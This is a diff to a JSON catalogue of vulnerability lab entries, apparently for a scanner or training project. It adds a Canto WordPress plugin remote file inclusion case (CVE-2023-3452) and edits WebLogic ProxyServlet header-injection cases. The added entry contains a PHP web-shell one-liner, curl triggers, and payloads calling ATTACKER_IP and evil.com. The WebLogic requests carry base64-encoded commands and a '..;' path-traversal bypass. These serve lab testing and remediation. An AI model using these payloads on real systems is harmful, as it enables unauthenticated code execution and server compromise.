@@ -1,5 +1,123 @@
 [
   {
+    "id": "vt-2023-3452",
+    "info": {
+      "name": "WordPress Canto Plugin Unauthenticated Remote File Inclusion (CVE-2023-3452)",
+      "author": "omarkurt",
+      "description": "The Canto plugin for WordPress is vulnerable to Remote File Inclusion\nin all versions up to, and including, 3.0.4 via the 'wp_abspath' parameter.\nThis makes it possible for unauthenticated attackers to include and execute\narbitrary remote code on the server, provided that allow_url_include is enabled.\n",
+      "targets": [
+        "wordpress",
+        "canto"
+      ],
+      "type": "CVE",
+      "cve": "CVE-2023-3452",
+      "cwe": "CWE-98",
+      "cvss": {
+        "score": 9.8,
+        "severity": "critical"
+      },
+      "affected_versions": [
+        "<= 3.0.4"
+      ],
+      "fixed_version": "3.0.5",
+      "tags": [
+        "rfi",
+        "rce",
+        "unauthenticated",
+        "wordpress",
+        "plugin",
+        "canto"
+      ]
+    },
+    "owasp": [
+      "A03:2021 - Injection"
+    ],
+    "vulnerabilities": [
+      {
+        "id": "rfi-rce",
+        "name": "Unauthenticated RFI via wp_abspath parameter",
+        "endpoint": "/wp-content/plugins/canto/includes/lib/download.php",
+        "method": "GET",
+        "param": "wp_abspath",
+        "authentication": {
+          "type": "none",
+          "required": false
+        },
+        "request": "GET /wp-content/plugins/canto/includes/lib/download.php?wp_abspath=http://ATTACKER_IP:PORT HTTP/1.1\nHost: {{target}}:8022\n",
+        "response": "HTTP/1.1 200 OK\nContent-Type: text/html; charset=UTF-8\n",
+        "payloads": [
+          {
+            "name": "Remote File Inclusion",
+            "value": "http://ATTACKER:8080",
+            "note": "Attacker must host /wp-admin/admin.php with malicious PHP code"
+          },
+          {
+            "name": "RCE via cmd parameter",
+            "value": "http://ATTACKER:8080&cmd=id",
+            "expected_output": "uid=33(www-data)"
+          }
+        ],
+        "indicators": {
+          "success": [
+            "uid=",
+            "www-data"
+          ],
+          "failure": [
+            "require_once(): Failed opening",
+            "allow_url_include"
+          ]
+        }
+      }
+    ],
+    "technical": "The vulnerability exists in the file:\nwp-content/plugins/canto/includes/lib/download.php\n\nVulnerable code:\n  require_once($_REQUEST['wp_abspath'] . '/wp-admin/admin.php');\n\nThe 'wp_abspath' parameter is taken directly from user input ($_REQUEST)\nwithout any validation or sanitization. When allow_url_include is enabled\nin PHP configuration, an attacker can supply a remote URL as the value\nof wp_abspath. PHP will then fetch and execute the remote file.\n\nThe plugin appends '/wp-admin/admin.php' to the attacker-controlled URL,\nso the attacker must host a file at that path on their server containing\narbitrary PHP code (e.g., system($_GET['cmd'])).\n\nAttack Flow:\n1. Attacker hosts malicious admin.php on their server (e.g., http://evil.com/wp-admin/admin.php)\n2. Attacker sends GET request to vulnerable endpoint with wp_abspath=http://evil.com\n3. Server executes: require_once('http://evil.com/wp-admin/admin.php')\n4. Malicious PHP code runs on the target server as www-data\n",
+    "impact": "- Full Remote Code Execution without authentication\n- Complete server compromise\n- Access to WordPress database credentials\n- Lateral movement to other services on the server\n- Data exfiltration (posts, users, passwords)\n- Defacement or backdoor installation\n- CVSS 9.8 Critical - Network accessible, no privileges required\n",
+    "remedy": "1. Update Canto plugin to version 3.0.5 or later\n2. Disable allow_url_include in php.ini (allow_url_include = Off)\n3. Remove the Canto plugin if not actively used\n4. Implement WAF rules to block RFI patterns in URL parameters\n",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2023-3452",
+      "https://www.exploit-db.com/exploits/51826",
+      "https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/canto/canto-304-unauthenticated-remote-file-inclusion",
+      "https://github.com/leoanggal1/CVE-2023-3452-PoC",
+      "https://patchstack.com/database/wordpress/plugin/canto/vulnerability/wordpress-canto-plugin-3-0-4-unauthenticated-remote-file-inclusion-vulnerability"
+    ],
+    "poc": {
+      "nuclei": [
+        "vt-2023-3452.nuclei.yaml"
+      ],
+      "manual": {
+        "steps": [
+          "1. docker-compose up -d --build",
+          "2. Complete WordPress setup at http://localhost:8022/",
+          "3. Activate Canto plugin in wp-admin",
+          "4. Start attacker server: mkdir -p /tmp/wp-admin && echo '<?php system($_GET[\"cmd\"]); ?>' > /tmp/wp-admin/admin.php && cd /tmp && python3 -m http.server 9090",
+          "5. Trigger RFI: curl 'http://localhost:8022/wp-content/plugins/canto/includes/lib/download.php?wp_abspath=http://HOST_IP:9090&cmd=id'"
+        ]
+      },
+      "curl_examples": [
+        {
+          "name": "Check vulnerable endpoint exists",
+          "command": "curl -s -o /dev/null -w \"%{http_code}\" http://localhost:8022/wp-content/plugins/canto/includes/lib/download.php\n"
+        },
+        {
+          "name": "Trigger RFI with command execution",
+          "command": "curl -s \"http://localhost:8022/wp-content/plugins/canto/includes/lib/download.php?wp_abspath=http://ATTACKER_IP:9090&cmd=id\"\n"
+        }
+      ]
+    },
+    "providers": {
+      "docker-compose": {
+        "path": "docker-compose.yaml",
+        "port": 8022
+      }
+    },
+    "metadata": {
+      "created": "2026-02-17",
+      "updated": "2026-02-17",
+      "version": "1.0.0"
+    },
+    "category": "cves",
+    "added_date": "2026-02-20T06:55:47+03:00"
+  },
+  {
     "id": "vt-2026-1357",
     "info": {
       "name": "WPvivid Backup & Migration - Unauthenticated Arbitrary File Upload to RCE",
@@ -155,7 +273,11 @@
           }
         ],
         "request": "GET /bea_wls_internal/ProxyServlet HTTP/1.1\nHost: {{Hostname}}\nwl-proxy-client-ip: 127.0.0.1;Y21kOndob2FtaQ==\nproxy-client-ip: 127.0.0.1;Y21kOndob2FtaQ==\nx-forwarded-for: 127.0.0.1;Y21kOndob2FtaQ==\nUser-Agent: Mozilla/5.0 (compatible; Exploit/1.0)\nAccept: */*\nConnection: close\n",
-        "response": "HTTP/1.1 200 OK\nServer: WebLogic Server 14.1.1.0.0\n\n<title>Proxy Servlet</title>\n<h1>BEA WebLogic Server Proxy Servlet</h1>\n<p>Mode: <span style=\"color: red\">VULNERABLE (CVE-2026-21962)</span></p>\n"
+        "response": "HTTP/1.1 200 OK\nServer: WebLogic Server 14.1.1.0.0\n\nProxy Servlet\nBEA WebLogic Server Proxy Servlet\nMode: VULNERABLE (CVE-2026-21962)\n",
+        "highlight": [
+          "VULNERABLE (CVE-2026-21962)",
+          "127.0.0.1;Y21kOndob2FtaQ=="
+        ]
       },
       {
         "id": 2,
@@ -178,7 +300,7 @@
           }
         ],
         "request": "GET /bea_wls_internal/ProxyServlet HTTP/1.1\nHost: {{Hostname}}\nwl-proxy-client-ip: 127.0.0.1;Y21kOndob2FtaQ==\nproxy-client-ip: 127.0.0.1;Y21kOndob2FtaQ==\nx-forwarded-for: 127.0.0.1;Y21kOndob2FtaQ==\nUser-Agent: Mozilla/5.0\nAccept: */*\nConnection: close\n",
-        "response": "HTTP/1.1 200 OK\n\n<title>Proxy Servlet</title>\n<h1>BEA WebLogic Server Proxy Servlet</h1>\n<p>Mode: <span style=\"color: red\">VULNERABLE (CVE-2026-21962)</span></p>\n"
+        "response": "HTTP/1.1 200 OK\n\nProxy Servlet\nBEA WebLogic Server Proxy Servlet\nMode: VULNERABLE (CVE-2026-21962)\n"
       },
       {
         "id": 3,
@@ -193,7 +315,7 @@
           }
         ],
         "request": "GET /bea_wls_internal/ProxyServlet HTTP/1.1\nHost: {{Hostname}}\nwl-proxy-client-ip: 127.0.0.1;Y21kOndob2FtaQ==\nUser-Agent: Mozilla/5.0\nAccept: */*\nConnection: close\n",
-        "response": "HTTP/1.1 200 OK\n\n<title>Proxy Servlet</title>\n<h1>BEA WebLogic Server Proxy Servlet</h1>\n"
+        "response": "HTTP/1.1 200 OK\n\nProxy Servlet\nBEA WebLogic Server Proxy Servlet\n"
       },
       {
         "id": 4,
@@ -216,7 +338,11 @@
           }
         ],
         "request": "GET /console/..;/bea_wls_internal/ProxyServlet HTTP/1.1\nHost: {{Hostname}}\nwl-proxy-client-ip: 127.0.0.1;Y21kOndob2FtaQ==\nproxy-client-ip: 127.0.0.1;Y21kOndob2FtaQ==\nx-forwarded-for: 127.0.0.1;Y21kOndob2FtaQ==\nUser-Agent: Mozilla/5.0\nAccept: */*\nConnection: close\n",
-        "response": "HTTP/1.1 200 OK\n\n<title>Proxy Servlet</title>\n"
+        "response": "HTTP/1.1 200 OK\n\nProxy Servlet\n",
+        "highlight": [
+          "console/..;/bea_wls_internal",
+          "127.0.0.1;Y21kOndob2FtaQ=="
+        ]
       },
       {
         "id": 5,
@@ -239,7 +365,12 @@
           }
         ],
         "request": "GET /bea_wls_internal/ProxyServlet HTTP/1.1\nHost: {{Hostname}}\nwl-proxy-client-ip: 127.0.0.1;Y21kOmlk\nproxy-client-ip: 127.0.0.1;Y21kOmlk\nx-forwarded-for: 127.0.0.1;Y21kOmlk\nUser-Agent: Mozilla/5.0\nAccept: */*\nConnection: close\n",
-        "response": "HTTP/1.1 200 OK\n\n<title>Proxy Servlet</title>\n<pre>cmd:id</pre>\n"
+        "response": "HTTP/1.1 200 OK\n\nProxy Servlet\ncmd:id\n",
+        "highlight": [
+          "cmd:id",
+          "127.0.0.1;Y21kOmlk",
+          "Proxy Servlet"
+        ]
       },
       {
         "id": 6,
@@ -249,7 +380,10 @@
         "method": "GET",
         "headers": [],
         "request": "GET /bea_wls_internal/ProxyServlet HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0\nAccept: */*\nConnection: close\n",
-        "response": "HTTP/1.1 401 Unauthorized\nWWW-Authenticate: Basic realm=\"WebLogic Server\"\n\n<title>401 Unauthorized</title>\n<h1>401 Unauthorized</h1>\n"
+        "response": "HTTP/1.1 401 Unauthorized\nWWW-Authenticate: Basic realm=\"WebLogic Server\"\n\n401 Unauthorized\n401 Unauthorized\n",
+        "highlight": [
+          "401 Unauthorized"
+        ]
       }
     ],
     "technical": "The vulnerability exists in the WebLogic Server Proxy Plug-in's request handling mechanism.\nThe plug-in fails to adequately validate and sanitize incoming HTTP headers used for\nproxy functionality, specifically:\n\n- wl-proxy-client-ip\n- proxy-client-ip\n- x-forwarded-for\n\nAttackers can inject malicious payloads by:\n1. Using semicolon-delimited values instead of comma-delimited (bypassing IP validation)\n2. Appending Base64-encoded commands (Y21kOndob2FtaQ== decodes to \"cmd:whoami\")\n3. Path traversal sequences (..;) to access restricted internal endpoints like /bea_wls_internal/ProxyServlet\n\nThe ProxyServlet is an internal WebLogic component that should not be directly accessible\nfrom external sources. The authentication bypass allows attackers to route requests through\nthis servlet, potentially accessing backend administration interfaces and internal APIs.\n",
